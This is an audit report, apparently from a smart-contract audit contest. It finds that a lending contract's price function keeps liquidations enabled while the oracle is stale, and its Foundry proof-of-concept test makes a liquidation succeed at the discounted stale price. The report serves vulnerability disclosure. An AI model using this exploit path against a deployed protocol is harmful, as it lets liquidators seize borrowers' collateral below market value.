# Title(High)
Stale Oracle Allows Liquidations Due to Missing Liquidation Disable Flag

## Summary

The protocol’s liquidation safety mechanism fails under stale oracle conditions because `getCollateralPrice()` does not disable liquidations when the oracle price becomes stale.
This allows attackers or opportunistic liquidators to trigger liquidations at artificially discounted oracle prices created by the staleness unwind logic, resulting in unfair collateral seizure and systemic under collateralization.

The exploit occurs because the code path for stale oracles never sets `allowLiquidations = false`, unlike the zero price or revert paths.

Inside [getCollateralPrice()](https://github.com/sherlock-audit/2025-12-monolith-stablecoin-factory/blob/main/Monolith/src/Lender.sol#L730-L743), liquidation disabling logic only exists for:
- oracle price = 0
- feed revert
- But not for stale oracle condition.

```solidity
 if (timeElapsed > stalenessThreshold) {  
            reduceOnly = true;  
            uint stalenessDuration = timeElapsed - stalenessThreshold;  
            if (stalenessDuration < STALENESS_UNWIND_DURATION) {  
                price = price * (STALENESS_UNWIND_DURATION - stalenessDuration) / STALENESS_UNWIND_DURATION;  
            } else {  
                price = 0;  
            }  
        }  
        price = price == 0 ? 1 : price; // avoid division by zero in consumer functions  
    }  
```

Stale oracle: reduceOnly = true. But `allowLiquidations` stays true.
This enables liquidation even though pricing data is stale and potentially incorrect.

**Internal Pre-conditions:**
1. Oracle needs to return a non zero price to set price to be other than 0.
2. Oracle needs to return an updatedAt timestamp that is at least stalenessThreshold seconds older than block.timestamp.
3. Stale oracle branch needs to execute to set reduceOnly to be exactly true.
4. Borrower needs to open a valid position to set debt to be greater than 0.
5. Collateral price unwind logic needs to run to set price to be less than the original oracle price.

**External Pre-conditions:**
1. Market price of collateral needs to stay above the borrower’s healthy threshold, ensuring liquidation is only caused by stale pricing.
2. Attacker (liquidator) needs to hold enough coin to set repayAmount to be at least the minimum liquidation amount.

**Attack Path:**
1. `FeedMock` had to be modified so test can simulate actual stale oracle condition where the bug occurs.
2. Oracle becomes stale naturally.
3. Protocol incorrectly keeps `allowLiquidations = true` in stale state.
4. Borrower has a normally healthy position at real market price.
5. Attacker liquidates using stale discounted price.
6. Liquidation succeeds when it should be blocked. Attacker receives excess collateral at an artificially cheap price.

## Impact
- forced liquidations at below market rates
- collateral theft
- borrower insolvency
- systemic under pricing of collateral
This is High severity because it enables predictable, repeatable economic extraction across all borrowers due to missing flag.

## POC

Using provide test suite: test/Lender.t.sol

```solidity
contract FeedMock {  
    uint8 public decimals = 18;  
    bool public shouldRevert;  
    int256 public price = 1e18; // Default price  
    uint256 public updatedAt; // manually controlled timestamp  
  
    constructor() {  
        updatedAt = block.timestamp;  
    }  
  
    function setShouldRevert(bool _shouldRevert) external {  
        shouldRevert = _shouldRevert;  
    }  
  
    function setPrice(int256 _price) external {  
        price = _price;  
    }  
  
    function setUpdatedAt(uint256 _updatedAt) external {  
        updatedAt = _updatedAt;  
    }  
  
    function latestRoundData()  
        external  
        view  
        returns (  
            uint80, /*roundId*/  
            int256, /*answer*/  
            uint256, /*startedAt*/  
            uint256, /*updatedAt*/  
            uint80 /*answeredInRound*/  
        )  
    {  
        if (shouldRevert) {  
            revert("Feed reverted");  
        }  
        return (0, price, 0, updatedAt, 0);  
    }  
}  

function test_liquidationAllowedEvenWhenOracleIsStale() public {  
        address borrower = address(0xBEEF);  
        address liquidator = address(0xCEEF);  
  
        FeedMock feed = FeedMock(address(lender.feed()));  
        ERC20Mock collateral = ERC20Mock(address(lender.collateral()));  
        ERC20Mock coin = ERC20Mock(address(lender.coin()));  
  
        // Setup collateral + coin balances  
        collateral.mint(borrower, 100e18); // borrower gets 100 collateral tokens  
        coin.mint(liquidator, 10_000e18); // liquidator has coin to repay debt  
  
        //Deposit collateral  
        vm.startPrank(borrower);  
        collateral.approve(address(lender), 100e18);  
        lender.adjust(borrower, 100e18, 0);  
        vm.stopPrank();  
  
        //Set high oracle price + fresh updatedAt before borrow  
        feed.setPrice(100e18);  
        feed.setUpdatedAt(block.timestamp); // fresh, not stale yet  
  
        //Borrow while price is correct  
        vm.startPrank(borrower);  
        lender.adjust(borrower, 0, int256(5_000e18)); // borrow 5000 COIN exactly at 50% LTV  
        vm.stopPrank();  
  
        // Verify borrower is solvent before stale period  
        {  
            (uint256 price,, bool allowLiqBefore) = lender.getCollateralPrice();  
            assertEq(price, 100e18, "Pre-stale price mismatch");  
            assertTrue(allowLiqBefore, "Liquidations should be allowed initially");  
        }  
  
        //Make oracle stale  
        uint256 stalenessThreshold = lender.stalenessThreshold();  
        uint256 initialTime = block.timestamp;  
  
        // Simulate price last updated at initialTime  
        feed.setUpdatedAt(initialTime);  
  
        // Warp forward beyond stalenessThreshold  
        vm.warp(initialTime + stalenessThreshold + 1 hours);  
  
        {  
            (uint256 stalePrice, bool reduceOnly, bool allowLiqAfter) = lender.getCollateralPrice();  
  
            assertTrue(reduceOnly, "reduceOnly must be true for stale oracle");  
            // Price is stale still allow liquidations  
            assertTrue(allowLiqAfter, "BUG EXPECTATION: allowLiquidations is still true even when stale");  
  
            //  
            assertLt(stalePrice, 100e18, "Price should be haircut after staleness");  
        }  
  
        // Liquidator prepares  
        vm.startPrank(liquidator);  
        coin.approve(address(lender), type(uint256).max);  
  
        uint256 beforeCol = collateral.balanceOf(liquidator);  
  
        uint256 repayAmount = 1000e18;  
        uint256 collateralOut = lender.liquidate(borrower, repayAmount, 0);  
  
        uint256 afterCol = collateral.balanceOf(liquidator);  
  
        // Liquidation wrongly succeeded  
        assertGt(collateralOut, 0, "Liquidation incorrectly blocked on stale oracle");  
        assertEq(afterCol - beforeCol, collateralOut, "Incorrect collateral transfer to liquidator");  
  
        vm.stopPrank();  
    }  

```
